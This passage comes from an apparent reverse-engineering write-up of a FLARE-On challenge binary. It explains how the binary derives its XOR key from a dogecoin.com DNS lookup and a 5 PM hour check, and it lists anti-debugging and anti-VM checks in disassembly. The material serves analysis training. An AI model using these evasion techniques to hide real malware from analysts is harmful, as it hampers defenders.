7&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hostent&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;FAR&lt;/span&gt;      &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;h_name;&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;// index: 0&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;FAR&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;FAR&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;h_aliases;&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;// index: 4 &lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;short&lt;/span&gt;         &lt;span style=&#34;color: #93A1A1&#34;&gt;h_addrtype;&lt;/span&gt;     &lt;span style=&#34;color: #586E75&#34;&gt;// index: 8&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;short&lt;/span&gt;         &lt;span style=&#34;color: #93A1A1&#34;&gt;h_length;&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;// index: 9&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;FAR&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;FAR&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;h_addr_list;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;HOSTENT,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;PHOSTENT,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;FAR&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;LPHOSTENT;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-16.jpg&#34; alt=&#34;Dogecoin.com IP&#34; title=&#34;Dogecoin.com IP&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then 8th byte will be compared with &lt;code&gt;2&lt;/code&gt; which is &lt;code&gt;h_addrtype&lt;/code&gt;. According to this &lt;a href=&#34;http://stackoverflow.com/q/2549461&#34; target=&#34;_blank&#34;&gt;stackoverflow answer&lt;/a&gt;, it is &lt;code&gt;AF_INET&lt;/code&gt; or &lt;code&gt;PF_INET&lt;/code&gt; defined in &lt;a href=&#34;http://repo-genesis3.cbi.utsa.edu/crossref/ns-sli/usr/include/bits/socket.h.html&#34; target=&#34;_blank&#34;&gt;bits/socket.h&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;inet_ntoa&lt;/code&gt; is converting the IP to ASCII IPv4 format (e.g. 192.168.0.1) and comparing it to &lt;code&gt;127.0.0.1&lt;/code&gt; two characters at a time like last check.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-17.jpg&#34; alt=&#34;xor paths for ip check&#34; title=&#34;xor paths for ip check&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The xor-string is &lt;code&gt;LETS GO MATH&lt;/code&gt; if the resolved IP address is not &lt;code&gt;127.0.0.1&lt;/code&gt;. If the IP address is &lt;code&gt;127.0.0.1&lt;/code&gt; or &lt;code&gt;h_addrtype&lt;/code&gt; is not &lt;code&gt;2&lt;/code&gt; then &lt;code&gt;SHOPPING IS HARD&lt;/code&gt; will be xor-ed with the blob.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Dogecoin.com IP check&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(h_addrtype&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(Dogecoin_ip&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;SHOPPING IS HARD&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(Dogecoin_ip&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;LETS GO MATH&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-11-hour-of-the-wolf:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 11 - Hour of the Wolf&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BeingDebugged&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;VMware_detection&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;Electric_Boogaloo&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;OutputDebugString&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;ICanHaz?&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;NtGlobalFlag&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;SandsOfTime&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BackDoge&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;IPCheck&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-18.jpg&#34; alt=&#34;Hour check&#34; title=&#34;Hour check&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Again, we see the familiar &lt;code&gt;time64&lt;/code&gt; and &lt;code&gt;localtime64&lt;/code&gt; calls. This time offset 8 of the &lt;code&gt;tm&lt;/code&gt; structure (copied below) is compared with &lt;code&gt;0x11&lt;/code&gt; or &lt;code&gt;17&lt;/code&gt;. This offset contains the number of hours after midnight, so the application is checking if it is between 5 and 6 PM.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;tm&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;// each field is an int (4 bytes)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_sec:&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;Seconds&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;after&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;minute&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;).&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index:&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_min:&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;Minutes&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;after&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hour&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;).&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index:&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_hour:&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;Hours&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;after&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;midnight&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;).&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index:&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_mday:&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;Day&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;month&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;).&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_mon:&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;Month&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;January&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;).&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_year:&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;Year&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(current&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;minus&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1900&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;).&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_wday:&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;Day&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;week&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Sunday&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;).&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_yday:&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;Day&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;365&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;January&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;).&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_isdst:&lt;/span&gt;   &lt;span style=&#34;color: #93A1A1&#34;&gt;Positive&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;daylight&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;saving&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;effect;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;daylight&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;saving&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;effect;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;negative&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;status&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;daylight&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;saving&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unknown.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;If time check passes, blob is xor-ed with &lt;code&gt;\x01\x02\x03\x05\x00\x78\x30\x38\x0d&lt;/code&gt; otherwise it will be xor-ed with &lt;code&gt;\x07\x77&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Hour check&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(Hour&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)):&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;# Between 5 and 6 PM&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x01\x02\x03\x05\x00\x78\x30\x38\x0d&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x07\x77&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;interlude-12-fullpath-xor:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Interlude - 12 - Fullpath xor&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BackDoge&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;IPCheck&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;HourCheck&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B4C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob_length&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
